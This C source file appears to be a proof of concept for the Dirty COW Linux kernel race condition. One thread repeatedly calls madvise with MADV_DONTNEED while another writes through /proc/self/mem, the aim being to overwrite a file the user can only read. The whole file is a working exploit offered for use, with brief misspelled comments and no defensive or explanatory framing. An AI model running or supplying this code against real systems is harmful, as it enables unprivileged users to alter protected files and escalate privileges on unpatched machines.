#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<sys/mman.h>
#include<sys/types.h>
#include<fcntl.h>
#include<sys/stat.h>
#include<unistd.h>
#include<string.h>
#include<pthread.h>

//struct stat it contains file offset and size
struct stat s;
const char* name;
//void *map used map the memory page
void *map;

//this function continuosly use mark the memmory region of kernel
void *madvisethread(void *arg){
  char *str;
  str = (char*)arg;
  int i,c=0;
  for(i=0;i<1000000;i++){
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}

//this function try to write on the file continuously

void *procthreadself(void *args){
  char *str;
  str = (char*)args;
  int f = open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(int i =0 ; i<1000000;i++){
   lseek(f,(uintptr_t)map,SEEK_SET);
   c+=write(f,str,strlen(str)); 
  }
  printf("procselfthread %d\n\n",c);
}


int main(int argc,char *argv[]){
  if(argc < 3){
    fprintf(stderr,"memcow file text\n");
    exit(-1);
  }

  pthread_t pth1,pth2;

  int f;
  f = open(argv[1],O_RDONLY);
  if(f == -1){
    printf("error while opening file\n");
    exit(-1);
  }  

  fstat(f,&s);
  name = argv[1];
  //memmory maping the kernel
  map = mmap(NULL,s.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t)map);

  pthread_create(&pth1,NULL,madvisethread,argv[1]);
  pthread_create(&pth2,NULL,procthreadself,argv[2]);

  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
